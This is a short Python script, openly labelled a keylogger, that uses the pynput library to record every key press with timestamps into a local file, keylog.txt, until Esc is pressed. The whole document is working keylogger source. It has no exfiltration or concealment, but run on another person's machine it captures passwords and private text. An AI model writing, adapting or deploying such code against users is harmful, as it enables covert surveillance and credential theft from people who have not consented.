from pynput.keyboard import Key, Listener
import logging
import os
current_path = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(current_path, "keylog.txt")
logging.basicConfig(filename=log_file,level=logging.DEBUG,format='%(asctime)s: %(message)s')
def on_press(key):
    try:logging.info(f"Key pressed: {key.char}")
    except AttributeError:logging.info(f"Special key pressed: {key}")
def on_release(key):
    if key==Key.esc:
        print("\nStopping keylogger...")
        return False
print(f"Keylogger is running... saving to: {log_file}")
print("Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:listener.join()
#giveup